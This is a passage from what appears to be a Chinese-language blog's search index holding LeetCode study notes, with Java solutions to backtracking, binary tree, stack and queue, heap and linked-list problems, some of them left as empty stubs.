for(int i=0;i&lt;letters.length();i++)&#123; findCombine(digits,index+1,str+letters.charAt(i)); &#125; &#125;&#125; 46. Permutations题目描述给定一个整形数组，元素不重复，返回这些元素所有排列的可能性。 代码实现123456789101112131415161718192021222324252627282930313233343536373839class Solution &#123; List&lt;List&lt;Integer&gt;&gt; result = new ArrayList&lt;&gt;(); public List&lt;List&lt;Integer&gt;&gt; permute(int[] nums) &#123; if(nums.length == 0) return result; combine(nums,0); return result; &#125; private void combine(int[] nums,int i)&#123; List&lt;Integer&gt; list = Arrays.stream( nums ).boxed().collect(Collectors.toList()); if(i == nums.length)&#123; if(!result.contains(list))&#123; result.add(list); return ; &#125; &#125; for(int j=i;j&lt;nums.length;j++)&#123; swap(nums,i,j); combine(nums,i+1); swap(nums,i,j); &#125; &#125; private void swap(int[] nums,int i,int j)&#123; if(i != j)&#123; int temp = nums[i]; nums[i] = nums[j]; nums[j] = temp; &#125; &#125;&#125; 77. Combinations题目描述给出两个整数n和k，求在1….n这n个数字中选出k个数字的所有组合。 如n=4,k=2 结果为[[2,4],[3,4],[2,3],[1,2],[1,3],[1,4]] 代码实现123456789101112131415161718192021222324252627282930class Solution &#123; //result set List&lt;List&lt;Integer&gt;&gt; result = new ArrayList&lt;&gt;(); public List&lt;List&lt;Integer&gt;&gt; combine(int n, int k) &#123; //border condition if(n &lt;= 0 || k &lt;= 0 || k&gt;n) return result; List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); //find from 1...n,so the start is 1 combineHelper(n,k,1,list); return result; &#125; private void combineHelper(int n,int k,int start,List&lt;Integer&gt; list)&#123; if(list.size() == k)&#123; result.add(new ArrayList&lt;Integer&gt;(list));//attention!!! result.add(list) is wrong! return; &#125; //Backtracking for(int i=start;i&lt;=n;i++)&#123; list.add(i); combineHelper(n,k,i+1,list); list.remove(list.size()-1); &#125; &#125;&#125; 79. Word Search题目描述board = [ [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;E&apos;], [&apos;S&apos;,&apos;F&apos;,&apos;C&apos;,&apos;S&apos;], [&apos;A&apos;,&apos;D&apos;,&apos;E&apos;,&apos;E&apos;] ] Given word = &quot;ABCCED&quot;, return true. Given word = &quot;SEE&quot;, return true. Given word = &quot;ABCB&quot;, return false. 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123; public boolean exist(char[][] board, String word) &#123; int rows = board.length; int cols = board[0].length; // is visited? true:flase // default is false boolean[][] flag = new boolean[rows][cols]; for(int i=0;i&lt;rows;i++)&#123; for(int j=0;j&lt;cols;j++)&#123; //combine(board,当前元素所在行，当前元素所在列，矩阵行数，矩阵列数，要匹配的字符串，字符串第一个位置，标识矩阵) if(combine(board,i,j,rows,cols,word,0,flag))&#123; return true; &#125; &#125; &#125; return false; &#125; private boolean combine(char[][] board,int i,int j,int rows,int cols,String word,int wordIndex,boolean[][] flag)&#123; // border condition if(i&lt;0 || j&lt;0 || i&gt;=rows || j&gt;=cols || flag[i][j]==true || board[i][j]!=word.charAt(wordIndex))&#123; return false; &#125; //stop condition if(wordIndex == word.length()-1) return true; //the first element is visited flag[i][j] = true; //backtracking to find the correct path if(combine(board,i+1,j,rows,cols,word,wordIndex+1,flag) || combine(board,i,j+1,rows,cols,word,wordIndex+1,flag) || combine(board,i-1,j,rows,cols,word,wordIndex+1,flag) || combine(board,i,j-1,rows,cols,word,wordIndex+1,flag)) &#123; return true; &#125; //if fail,reset the first element flag flag[i][j] = false; return false; &#125;&#125; 200. Number of Islands题目描述给定一个二维数组，只含有0和1两个字符，其中1代表陆地，0代表水域，横向和纵向额陆地连接为岛屿，被水域分隔开，问给出的地图中有多少岛屿？ example1.Input: 11110 11010 11000 00000 Output: 1 example2.Input: 11000 11000 00100 00011 Output: 3 代码实现1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123; public int numIslands(char[][] grid) &#123; int rows = grid.length; if(rows == 0) return 0; int cols = grid[0].length; boolean[][] flag = new boolean[rows][cols]; //the amount of island int cnt = 0; for(int i=0;i&lt;rows;i++)&#123; for(int j=0;j&lt;cols;j++)&#123; //第一个满足条件，那么就是一个岛屿，立即加一，下面只是搜索附近与他构成岛屿的岛屿 if(grid[i][j] == '1' &amp;&amp; flag[i][j] == false)&#123; cnt++; searchAround(grid,i,j,rows,cols,flag); &#125; &#125; &#125; return cnt; &#125; private void searchAround(char[][] grid,int i,int j,int rows,int cols,boolean[][] flag)&#123; if(i&lt;0 || j&lt;0 || i&gt;=rows || j&gt;= cols || flag[i][j]==true || grid[i][j] == '0') return; flag[i][j] = true; //回溯法进行寻找周围是否有符合条件的，符合条件的将其flag置为true，并且递归结束仍然保留这个flag位 searchAround(grid,i+1,j,rows,cols,flag); searchAround(grid,i,j+1,rows,cols,flag); searchAround(grid,i-1,j,rows,cols,flag); searchAround(grid,i,j-1,rows,cols,flag); return; &#125;&#125; 51. N-Queens题目描述 Input: 4 Output: [ [&quot;.Q..&quot;, // Solution 1 &quot;...Q&quot;, &quot;Q...&quot;, &quot;..Q.&quot;], [&quot;..Q.&quot;, // Solution 2 &quot;Q...&quot;, &quot;...Q&quot;, &quot;.Q..&quot;] ] Explanation: There exist two distinct solutions to the 4-queens puzzle as shown above. 代码实现看到一个人用三个HashSet来实现： 12345678910111213141516171819202122232425262728293031323334353637public class Solution &#123; private Set&lt;Integer&gt; col = new HashSet&lt;Integer&gt;(); private Set&lt;Integer&gt; diag1 = new HashSet&lt;Integer&gt;(); private Set&lt;Integer&gt; diag2 = new HashSet&lt;Integer&gt;(); public List&lt;List&lt;String&gt;&gt; solveNQueens(int n) &#123; List&lt;List&lt;String&gt;&gt; res = new ArrayList&lt;List&lt;String&gt;&gt;(); dfs(res,new ArrayList&lt;String&gt;(), 0, n); return res; &#125; private void dfs(List&lt;List&lt;String&gt;&gt; res, List&lt;String&gt; list, int row, int n)&#123; if (row == n)&#123; res.add(new ArrayList&lt;String&gt;(list)); return; &#125; for (int i = 0; i &lt; n; i++)&#123; if (col.contains(i) || diag1.contains(row + i) || diag2.contains(row - i)) continue; char[] charArray = new char[n]; Arrays.fill(charArray, '.'); charArray[i] = 'Q'; String rowString = new String(charArray); list.add(rowString); col.add(i); diag1.add(row + i); diag2.add(row - i); dfs(res, list, row + 1, n); list.remove(list.size() - 1); col.remove(i); diag1.remove(row + i); diag2.remove(row - i); &#125; &#125;&#125; 下面有个人评论： This is a very nicely written code. However, I suggest that let&apos;s use 3 boolean arrays instead. Let&apos;s compare the run time: HashSet: 15ms, beats 17.85% Boolean Array: 5ms, beats 91.44% 下面用三个boolean[]来进行改进： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class Solution &#123; List&lt;List&lt;String&gt;&gt; result = new ArrayList&lt;&gt;(); public List&lt;List&lt;String&gt;&gt; solveNQueens(int n) &#123; boolean[] visited = new boolean[n]; //2*n-1个斜对角线 boolean[] dia1 = new boolean[2*n-1]; boolean[] dia2 = new boolean[2*n-1]; fun(n, new ArrayList&lt;String&gt;(),visited,dia1,dia2,0); return result; &#125; private void fun(int n,List&lt;String&gt; list,boolean[] visited,boolean[] dia1,boolean[] dia2,int rowIndex)&#123; if(rowIndex == n)&#123; result.add(new ArrayList&lt;String&gt;(list)); return; &#125; for(int i=0;i&lt;n;i++)&#123; //这一行、正对角线、反对角线都不能再放了，如果发现是true，停止本次循环 if(visited[i] || dia1[rowIndex+i] || dia2[rowIndex-i+n-1]) continue; //init一个长度为n的一维数组，里面初始化为'.' char[] charArray = new char[n]; Arrays.fill(charArray,'.'); charArray[i] = 'Q'; String stringArray = new String(charArray); list.add(stringArray); visited[i] = true; dia1[rowIndex+i] = true; dia2[rowIndex-i+n-1] = true; fun(n,list,visited,dia1,dia2,rowIndex+1); //reset 不影响回溯的下个目标 list.remove(list.size()-1); charArray[i] = '.'; visited[i] = false; dia1[rowIndex+i] = false; dia2[rowIndex-i+n-1] = false; &#125; &#125; &#125;]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[六、二叉树问题]]></title>
    <url>%2F2018%2F08%2F16%2F%E5%85%AD%E3%80%81%E4%BA%8C%E5%8F%89%E6%A0%91%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[二叉树问题。 104. Maximum Depth of Binary Tree题目描述求一颗二叉树的最高深度。从根节点到叶子节点的最长路径长度。 代码实现1234567891011class Solution &#123; public int maxDepth(TreeNode root) &#123; if(root == null) return 0; int leftMaxDepth = maxDepth(root.left); int rightMaxDepth = maxDepth(root.right); return Math.max(leftMaxDepth,rightMaxDepth)+1; &#125;&#125; 111. Minimum Depth of Binary Tree题目描述求一颗二叉树的最小深度 代码实现1234567891011121314151617181920class Solution &#123; public int minDepth(TreeNode root) &#123; if(root == null) return 0; //因为题目要求是求根节点到叶子节点的最短高度，那么情况与求最高深度是略有不同的 //如果不进行下面的判断，那么求出来的深度并不是到叶子节点的 if(root.left == null) return minDepth(root.right) + 1; if(root.right == null) return minDepth(root.left) + 1; //下面与求最大深度是一样的，只是换成Math.min即可 int leftMinDepth = minDepth(root.left); int rightMinDepth = minDepth(root.right); return Math.min(leftMinDepth,rightMinDepth)+1; &#125;&#125; 226. Invert Binary Tree题目描述二叉树的镜像翻转 代码实现12345678910111213class Solution &#123; public TreeNode invertTree(TreeNode root) &#123; if(root == null) return null; TreeNode left = invertTree(root.left); TreeNode right = invertTree(root.right); root.left = right; root.right = left; return root; &#125;&#125; 100. Same Tree题目描述判断两个二叉树是否相等 代码实现123456789101112class Solution &#123; public boolean isSameTree(TreeNode p, TreeNode q) &#123; if(p == null &amp;&amp; q == null) return true; if(p == null || q == null) return false; if(p.val == q.val) return isSameTree(p.left,q.left) &amp;&amp; isSameTree(p.right,q.right); return false; &#125;&#125; 101. Symmetric Tree题目描述判断二叉树是否是左右对称 代码实现12345678910111213141516171819class Solution &#123; public boolean isSymmetric(TreeNode root) &#123; if(root == null) return true; return isSymmetricHelp(root.left,root.right); &#125; private boolean isSymmetricHelp(TreeNode left,TreeNode right)&#123; //判断是否为Null if(left == null || right == null) return left==right; //走到这一步，说明都不为Null，判断两边的值是否相等 if(left.val != right.val) return false; //递归判断 return isSymmetricHelp(left.left,right.right) &amp;&amp; isSymmetricHelp(left.right,right.left); &#125;&#125; 222. Count Complete Tree Nodes题目描述给定一颗完全二叉树，求完全二叉树的节点个数 代码实现1234567891011121314151617181920212223242526272829303132class Solution &#123; public int countNodes(TreeNode root) &#123; if(root == null) return 0; int leftDepth = leftDepth(root); int rightDepth = rightDepth(root); if(leftDepth == rightDepth) return (1 &lt;&lt; leftDepth)-1; else return countNodes(root.left)+countNodes(root.right)+1; &#125; private int leftDepth(TreeNode root)&#123; int dep = 0; while(root != null)&#123; root = root.left; dep++; &#125; return dep; &#125; private int rightDepth(TreeNode root)&#123; int dep = 0; while(root != null)&#123; root = root.right; dep++; &#125; return dep; &#125;&#125; 110. Balanced Binary Tree题目描述给定一颗二叉树是否为平衡二叉树（每个节点的左右子树的高度差不超过1） 代码实现1234567891011121314151617181920class Solution &#123; private boolean result = true; public boolean isBalanced(TreeNode root) &#123; judge(root); return result; &#125; //利用求二叉树的最大深度的时候，判断左右树的最大深度 private int judge(TreeNode root)&#123; if(root == null) return 0; int leftDep = judge(root.left); int rightDep = judge(root.right); if(Math.abs(leftDep-rightDep) &gt; 1)&#123; result = false; &#125; return Math.max(leftDep,rightDep)+1; &#125;&#125; 112. Path Sum题目描述给出一颗二叉树以及一个数字sum，判断在这颗二叉树上是否存在一条从根到叶子的路径，其路径上的所有节点和为sum 代码实现123456789101112class Solution &#123; public boolean hasPathSum(TreeNode root, int sum) &#123; if(root == null) return false; //这才是真正到达叶子节点 if(root.left == null &amp;&amp; root.right == null)&#123; return root.val == sum; &#125; //递归判断 return hasPathSum(root.left,sum-root.val) || hasPathSum(root.right,sum-root.val); &#125;&#125; 404. Sum of Left Leaves题目描述求二叉树左叶子节点值之和 代码实现123456789101112131415161718192021class Solution &#123; public int sumOfLeftLeaves(TreeNode root) &#123; if(root == null) return 0; int sum = 0; if(root.left != null)&#123; if(root.left.left==null &amp;&amp; root.left.right==null)&#123; sum += root.left.val; &#125; else&#123; sum += sumOfLeftLeaves(root.left); &#125; &#125; sum += sumOfLeftLeaves(root.right); return sum; &#125;&#125; 257. Binary Tree Paths题目描述Given a binary tree, return all root-to-leaf paths. 代码实现1234567891011121314151617class Solution &#123; public List&lt;String&gt; binaryTreePaths(TreeNode root) &#123; List&lt;String&gt; list = new ArrayList&lt;&gt;(); if(root != null) binaryTreePathsHelper(root,list,""); return list; &#125; private void binaryTreePathsHelper(TreeNode root,List&lt;String&gt; list,String result)&#123; if(root.left == null &amp;&amp; root.right == null) list.add(result+root.val+""); if(root.left != null) binaryTreePathsHelper(root.left,list,result+root.val+"-&gt;"); if(root.right != null) binaryTreePathsHelper(root.right,list,result+root.val+"-&gt;"); &#125;&#125;]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[五、栈和队列问题]]></title>
    <url>%2F2018%2F08%2F16%2F%E4%BA%94%E3%80%81%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[栈和队列问题。 20. Valid Parentheses题目描述给定一符号字符串，然后判断是否左右匹配。如： Example 1: Input: “()” Output: true Example 2: Input: “()[]{}” Output: true Example 3: Input: “(]” Output: false Example 4: Input: “([)]” Output: false Example 5: Input: “{[]}” Output: true 代码实现123456789101112131415161718192021222324252627282930313233343536373839//整体思路就是：遇到左括号就压栈，遇到右括号就弹出栈顶元素进行比较class Solution &#123; public boolean isValid(String s) &#123; Stack stack = new Stack(); for(int i=0;i&lt;s.length();i++)&#123; //先判断如果是左括号，就压入栈顶 if(s.charAt(i) == '(' || s.charAt(i) == '&#123;' || s.charAt(i) == '[')&#123; stack.push(s.charAt(i)); //如果是右括号 &#125;else&#123; //先判断栈是否为空，为空的话，说明没有左括号，直接返回false if(stack.isEmpty())&#123; return false; &#125; char c = s.charAt(i); if(')' == c)&#123; //如果的确是一个右括号，那么就将栈顶元素弹出，并且判断这个弹出的元素是否为对应的左括号 char popc = (char)stack.pop(); if(popc != '(') return false; &#125; if('&#125;' == c)&#123; char popc = (char)stack.pop(); if(popc != '&#123;') return false; &#125; if(']' == c)&#123; char popc = (char)stack.pop(); if(popc != '[') return false; &#125; &#125; &#125; //栈为空的时候，才return true if(!stack.isEmpty()) return false; return true; &#125;&#125; 144. Binary Tree Preorder Traversal、题目描述二叉树的前序遍历 代码实现递归版本： 12345678910111213141516171819202122/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; List&lt;Integer&gt; list = new LinkedList&lt;&gt;(); public List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123; if(root != null)&#123; list.add(root.val); preorderTraversal(root.left); preorderTraversal(root.right); &#125; return list; &#125;&#125; 非递归版本： 12345678910111213141516171819202122class Solution &#123; public List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123; //盛放返回结果 List&lt;Integer&gt; list = new LinkedList&lt;&gt;(); if(root == null) return list; //用栈来存放节点来代替递归算法 Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); //只要栈不为空就一直循环下去 while(!stack.isEmpty())&#123; //弹出栈顶元素，所以下面入栈的时候，先入右孩子，再入左孩子，这样出栈的时候才是左孩子先出来，然后是右孩子再出来 TreeNode curr = stack.pop(); list.add(curr.val); if(curr.right != null) stack.push(curr.right); if(curr.left != null) stack.push(curr.left); &#125; return list; &#125;&#125; 94. Binary Tree Inorder Traversal题目描述二叉树的中序遍历 代码实现递归版本：1234567891011class Solution &#123; List&lt;Integer&gt; list = new LinkedList&lt;&gt;(); public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; if(root != null)&#123; inorderTraversal(root.left); list.add(root.val); inorderTraversal(root.right); &#125; return list; &#125;&#125; 非递归版本： 12345678910111213141516171819class Solution &#123; public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new LinkedList&lt;&gt;(); Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); TreeNode curr = root; while(curr != null || !stack.isEmpty())&#123; while(curr != null)&#123; stack.push(curr); curr = curr.left; &#125; curr = stack.pop(); list.add(curr.val); curr = curr.right; &#125; return list; &#125;&#125; 145. Binary Tree Postorder Traversal题目描述二叉树的后序遍历 代码实现递归版本： 1234567891011class Solution &#123; List&lt;Integer&gt; list = new LinkedList&lt;&gt;(); public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; if(root != null)&#123; inorderTraversal(root.left); inorderTraversal(root.right); list.add(root.val); &#125; return list; &#125;&#125; 非递归版本： 123456789101112131415161718192021class Solution &#123; public List&lt;Integer&gt; postorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; list = new LinkedList&lt;&gt;(); if(root == null) return list; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); //这里采用一种比较巧的方法：类似于先序遍历，不过先遍历右孩子，再遍历左孩子 while(!stack.isEmpty())&#123; TreeNode curr = stack.pop(); list.add(curr.val); if(curr.left != null) stack.push(curr.left); if(curr.right != null) stack.push(curr.right); &#125; //翻转List，就是后序遍历的结果 Collections.reverse(list); return list; &#125;&#125; 102. Binary Tree Level Order Traversal题目描述二叉树的层序遍历 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution &#123; public List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123; LinkedList&lt;List&lt;Integer&gt;&gt; resultList = new LinkedList&lt;&gt;(); if(root == null) return resultList; //存放每行所有节点的容器，里面是节点对象本身 LinkedList&lt;TreeNode&gt; nodeList = new LinkedList&lt;&gt;(); nodeList.add(root); //二叉树每行节点个数 int nodeNum = 0; while(!nodeList.isEmpty())&#123; //这里的size就是每次循环计算的每行的节点个数 nodeNum = nodeList.size(); LinkedList&lt;Integer&gt; intNode = new LinkedList&lt;&gt;(); //遍历每行节点的左右子节点，存在的就放进队列里 while(nodeNum&gt;0)&#123; TreeNode node = nodeList.pop(); if(node.left!=null)&#123; nodeList.add(node.left); intNode.add(node.left.val); &#125; if(node.right!=null)&#123; nodeList.add(node.right); intNode.add(node.right.val); &#125; nodeNum--; &#125; //添加进结果集中 if(!intNode.isEmpty())&#123; resultList.add(intNode); &#125; &#125; //将根节点放在List的第一个位置 LinkedList&lt;Integer&gt; intNode = new LinkedList&lt;&gt;(); intNode.add(root.val); resultList.addFirst(intNode); return resultList; &#125;&#125; 279. Perfect Squares题目描述Given a positive integer n, find the least number of perfect square numbers (for example, 1, 4, 9, 16, …) which sum to n. For example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9. 解题思路dp[0] = 0 dp[1] = dp[0]+1 = 1 dp[2] = dp[1]+1 = 2 dp[3] = dp[2]+1 = 3 dp[4] = Min{ dp[4-1*1]+1, dp[4-2*2]+1 } = Min{ dp[3]+1, dp[0]+1 } = Min{4,1} = 1 dp[5] = Min{ dp[5-1*1]+1, dp[5-2*2]+1 } = Min{ dp[4]+1, dp[1]+1 } = 2 dp[13] = Min{ dp[13-1*1]+1, dp[13-2*2]+1, dp[13-3*3]+1 } = Min{ dp[12]+1, dp[9]+1, dp[4]+1 } = 2 . . . dp[n] = Min{ dp[n - i*i] + 1 }, n - i*i &gt;=0 &amp;&amp; i &gt;= 1 代码实现1234567891011121314151617class Solution &#123; public int numSquares(int n) &#123; int[] dp = new int[n+1]; Arrays.fill(dp, Integer.MAX_VALUE); dp[0] = 0; for(int i=1;i&lt;=n;i++)&#123; int min = Integer.MAX_VALUE; int j=1; while(i-j*j&gt;=0)&#123; min = Math.min(min, dp[i - j*j] + 1); j++; &#125; dp[i] = min; &#125; return dp[n]; &#125;&#125; 堆的底层实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970//最大堆 import java.util.ArrayList; public class Heap&lt;E extends Comparable&gt;&#123; private ArrayList&lt;E&gt; list=new ArrayList&lt;E&gt;();//用数组实现堆 public Heap()&#123;&#125; public Heap(E[] objects)&#123; for(int i=0;i&lt;objects.length;i++)&#123; add(objects[i]); &#125; &#125; public void add(E newObject)&#123;//添加一个元素 list.add(newObject); int currentIndex=list.size()-1; while(currentIndex&gt;0)&#123; int parentIndex=(currentIndex-1)/2;//找到该结点的父结点 if(list.get(currentIndex).compareTo(list.get(parentIndex))&gt;0)&#123;//与父节点比较 //如果当前结点的值大于父结点就交换位置 E temp=list.get(currentIndex); list.set(currentIndex, list.get(parentIndex)); list.set(parentIndex, temp); &#125; else break; currentIndex=parentIndex; &#125; &#125; public E remove()&#123;//删除并返回根结点,堆的特点是移除了根结点后还是堆 if(list.size()==0) return null; E removeObject=list.get(0); list.set(0, list.get(list.size()-1));//把最后一个结点放在根结点的位置 list.remove(list.size()-1); int currentIndex=0; while(currentIndex&lt;list.size())&#123; int leftChildIndex=2*currentIndex+1; int rightChildIndex=2*currentIndex+2;//左右孩子结点的坐标 if(leftChildIndex&gt;=list.size())break; //比较左右孩子的值，使maxIndex指向值大的结点 int maxIndex=leftChildIndex; if(rightChildIndex&lt;list.size())&#123; if(list.get(maxIndex).compareTo(list.get(rightChildIndex))&lt;0)&#123; maxIndex=rightChildIndex; &#125; &#125; //如果当前结点的值小于其左右孩子中的大的值，就交换两个结点 if(list.get(currentIndex).compareTo(list.get(maxIndex))&lt;0)&#123; E temp=list.get(maxIndex); list.set(maxIndex, list.get(currentIndex)); list.set(currentIndex, temp); currentIndex=maxIndex; &#125; else break; &#125; return removeObject; &#125; public int getSize()&#123; return list.size(); &#125; &#125; 347. Top K Frequent Elements题目描述Given a non-empty array of integers, return the k most frequent elements. For example, Given [1,1,1,2,2,3] and k = 2, return [1,2]. 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344class Solution &#123; public List&lt;Integer&gt; topKFrequent(int[] nums, int k) &#123; //Map&lt;数组中出现的值，这个值对应的出现次数&gt; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); for(int temp:nums)&#123; if(map.get(temp) == null)&#123; map.put(temp,1); &#125;else&#123; map.put(temp,map.get(temp)+1); &#125; &#125; //一个数组，数组元素是list，list存放所有出现次数相同的元素 //比如输入1,2,2,3,3那么这个数组是&#123;&#123;1&#125;,&#123;2,3&#125;&#125; //比如输入1,2那么这个数组是&#123;&#123;1,2&#125;&#125; //以出现的频率为数组下标，那么频率高的必定出现在数组的后面 //数组长度为什么是nums.length+1？假设输入的是[1,1,1,1,1]，就是五个1，那么按照这个程序，1存放的下标是5，但是数组下标范围是0-4，所以会溢出 List&lt;Integer&gt;[] listBucket = new List[nums.length+1]; for(int key:map.keySet())&#123; int frequence = map.get(key); if(listBucket[frequence] == null)&#123; listBucket[frequence] = new ArrayList&lt;&gt;(); &#125; listBucket[frequence].add(key); &#125; //由于高频率的值出现在数组后面，那么从后往前遍历，找到前k个频率最高的值 List&lt;Integer&gt; resultList = new LinkedList&lt;&gt;(); for(int pos = listBucket.length-1;pos&gt;=0;pos--)&#123; if(listBucket[pos] != null)&#123; //修改的地方-----&gt;这里不是添加所有，然后要制定添加的个数不能超过制定的总个数 for(int temp:listBucket[pos])&#123; if(resultList.size()&lt;k)&#123; resultList.add(temp); &#125;else&#123; break; &#125; &#125; &#125; &#125; return resultList; &#125;&#125;]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[四、链表问题]]></title>
    <url>%2F2018%2F08%2F16%2F%E5%9B%9B%E3%80%81%E9%93%BE%E8%A1%A8%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[链表问题。 206. Reverse Linked List题目描述反转一个单向链表 代码实现123456789101112131415161718192021222324/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode reverseList(ListNode head) &#123; if(head == null)&#123; return null; &#125; ListNode currentNode = head; ListNode pre = null; while(currentNode != null)&#123; ListNode next = currentNode.next; currentNode.next = pre; pre = currentNode; currentNode = next; &#125; return pre; &#125;&#125; 92. Reverse Linked List II题目描述反转一个链表从m到n的元素。 Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, m = 2, n = 4 Output: 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;NULL 代码实现12345678910111213141516171819202122232425262728293031323334353637/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode reverseBetween(ListNode head, int m, int n) &#123; ListNode dummy = new ListNode(0); dummy.next = head; ListNode pre1 = null; ListNode cur1 = dummy; for(int i=0;i&lt;m;i++)&#123; pre1 = cur1; cur1 = cur1.next; &#125; ListNode pre2 = pre1; ListNode cur2 = cur1; ListNode p; for(int i=m;i&lt;=n;i++)&#123; p = cur2.next; cur2.next = pre2; pre2 = cur2; cur2 = p; &#125; pre1.next = pre2; cur1.next = cur2; return dummy.next; &#125;&#125; 83. Remove Duplicates from Sorted List题目描述给出一个有序链表，删除其中所有重复元素，使得每个元素只保留一次。 Input: 1-&gt;1-&gt;2 Output: 1-&gt;2 Input: 1-&gt;1-&gt;2-&gt;3-&gt;3 Output: 1-&gt;2-&gt;3 代码实现12345678910111213141516171819202122232425/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode deleteDuplicates(ListNode head) &#123; ListNode node = head; while(node != null)&#123; ListNode nextNode = node.next; if(nextNode != null &amp;&amp; node.val == nextNode.val)&#123; node.next = nextNode.next; nextNode = nextNode.next; &#125;else&#123; node = nextNode; &#125; &#125; return head; &#125;&#125; 86. Partition List题目描述给出一个链表以及一个数x，将链表重新整理，使得小于x的元素在前，大于等于x的元素在后。 Input: head = 1-&gt;4-&gt;3-&gt;2-&gt;5-&gt;2, x = 3 Output: 1-&gt;2-&gt;2-&gt;4-&gt;3-&gt;5 代码实现12 328. Odd Even Linked List题目描述给出一个链表，将链表重新整理，使得所有索引为奇数的节点排在索引为偶数的节点前面。 奇数索引的节点和偶数索引的节点在重新整理后要保持相对顺序。 Given 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, return 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL. 代码实现12 2. Add Two Numbers题目描述给出两个非空链表，表示两个非负整数，其中每一个整数的各位数字以逆序存储，返回这两个整数相加所代表的链表。 342 + 465 = 807. Input: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4) Output: 7 -&gt; 0 -&gt; 8 代码实现12 445. Add Two Numbers II题目描述给出两个非空链表，表示两个非负整数，其中每一个整数的各位数字以顺序存储，返回这两个整数相加所代表的链表。 342 + 465 = 807. Input: (3 -&gt; 4 -&gt; 2) + (4 -&gt; 6 -&gt; 5) Output: 8 -&gt; 0 -&gt; 7 代码实现12 技巧：设置链表的虚拟头节点 203. Remove Linked List Elements题目描述在链表中删除值为val的所有节点 Given: 1 –&gt; 2 –&gt; 6 –&gt; 3 –&gt; 4 –&gt; 5 –&gt; 6, val = 6 Return: 1 –&gt; 2 –&gt; 3 –&gt; 4 –&gt; 5 代码实现12345678910111213141516171819202122232425/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode removeElements(ListNode head, int val) &#123; ListNode dummy = new ListNode(0); dummy.next = head; ListNode cur = dummy; while(cur.next != null)&#123; if(cur.next.val == val)&#123; ListNode delNode = cur.next; cur.next = delNode.next; &#125;else&#123; cur = cur.next; &#125; &#125; return dummy.next; &#125;&#125; 82. Remove Duplicates from Sorted List II题目描述给定一个有序链表，将其中有重复的元素全部删除。 Input: 1-&gt;2-&gt;3-&gt;3-&gt;4-&gt;4-&gt;5 Output: 1-&gt;2-&gt;5 Input: 1-&gt;1-&gt;1-&gt;2-&gt;3 Output: 2-&gt;3 代码实现123456789101112131415161718192021222324252627282930313233343536/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode deleteDuplicates(ListNode head) &#123; ListNode dummy = new ListNode(0); dummy.next = head; ListNode pre = dummy; ListNode cur = head; while(cur != null)&#123; //当前节点与下一个节点重复的话 if(cur.next != null &amp;&amp; cur.val == cur.next.val)&#123; //第一个重复的值 int val = cur.val; //先移到下一个 cur = cur.next; //一个个地比较，知道不相等为止 while(cur!=null &amp;&amp; cur.val == val)&#123; cur = cur.next; &#125; pre.next = cur; //当前节点与下一个节点不重复 &#125;else&#123; pre = cur; cur = cur.next; &#125; &#125; return dummy.next; &#125;&#125; 21. Merge Two Sorted Lists题目描述merge两个有序的链表 代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode mergeTwoLists(ListNode l1, ListNode l2) &#123; if(l1 == null &amp;&amp; l2 == null)&#123; return null; &#125; if(l1 == null) return l2; if(l2 == null) return l1; ListNode p1 = l1; ListNode p2 = l2; ListNode head = new ListNode(0); ListNode cur = head; while(p1 != null &amp;&amp; p2 != null)&#123; if(p1.val &lt;= p2.val)&#123; cur.next = p1; p1 = p1.next; &#125;else&#123; cur.next = p2; p2 = p2.next; &#125; cur = cur.next; &#125; if(p1 != null)&#123; cur.next = 